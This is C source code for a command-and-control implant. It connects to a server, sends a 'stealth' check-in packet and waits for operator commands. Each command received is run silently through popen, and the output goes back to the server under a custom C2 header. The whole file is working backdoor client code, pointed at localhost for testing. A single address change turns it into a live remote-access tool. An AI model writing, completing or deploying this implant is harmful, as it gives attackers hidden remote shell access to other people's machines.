#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include "protocol.h"

#define PORT 8080

void handle_execute_shell(int sock, unsigned int cmd_len)
{
  // Allocate memory and read the incoming string command from the server
  char *cmd = (char*)calloc(cmd_len + 1, sizeof(char));
  if (cmd == NULL)
  {
    printf("Failed to allocate command buffer");
    return;
  }
  recv(sock, cmd, cmd_len, 0);

  // Execute command silently using a memory pipe
  // The implant's purpose is executing operator-supplied shell commands.
  FILE *fp = popen(cmd, "r"); // NOLINT(bugprone-command-processor,clang-analyzer-optin.taint.GenericTaint)
  free(cmd);
  if (fp == NULL)
  {
    printf("Failed to open file");
    return;
  }

  // Read execution output into a dynamic response buffer
  char output_buf[4096] = {0};
  unsigned int total_len = 0;

  // Read directly into the bounded response buffer to cap output size
  while (total_len < sizeof(output_buf) - 1)
  {
    size_t bytes_read = fread(output_buf + total_len, 1,
                              sizeof(output_buf) - 1 - total_len, fp);
    if (bytes_read == 0)
    {
      break;
    }
    total_len += (unsigned int)bytes_read;
  }
  pclose(fp);

  // Send the result back with a protocal header
  struct C2_HEADER response_header = {0x41414141, CMD_EXECUTE_SHELL, total_len};

  send(sock, &response_header, sizeof(struct C2_HEADER), 0);
  if (total_len > 0)
  {
    send(sock, output_buf, total_len, 0);
  }
}

int main(int argc, char *argv[])
{
  int sock = 0;
  struct sockaddr_in serv_addr;

  // Create socket
  sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock < 0)
  {
    printf("\n Socket creation error \n");
    return 1;
  }

  // Set server address
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_port = htons(PORT);

  // Connect to localhost for testing purposes
  if (inet_pton(AF_INET, "127.0.0.1", &serv_addr.sin_addr) <= 0)
  {
    printf("\nInvalid address/ Address not supported \n");
    return 1;
  }

  // Connect to the server
  if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0)
  {
    printf("\nConnection Failed \n");
    return 1;
  }

  // Build the stealth packet header
  struct C2_HEADER header = {0x41414141, CMD_CHECK_IN, 0};
  
  // Send stealth packet directly over the wire
  send(sock, &header, sizeof(header), 0);

  // Enter continuous reading loop to process incoming server commands
  while (1)
  {
    struct C2_HEADER incoming_header;
    ssize_t bytes = recv(sock, &incoming_header, sizeof(struct C2_HEADER), 0);
    if (bytes <= 0) break; // Server disconnected

    if (incoming_header.magic == 0x41414141)
    {
      if (incoming_header.command_id == CMD_EXECUTE_SHELL)
      {
        handle_execute_shell(sock, incoming_header.payload_size);
      } else if (incoming_header.command_id == CMD_EXIT)
      {
        break;
      }
    }
  }

  close(sock);
  return 0;
}
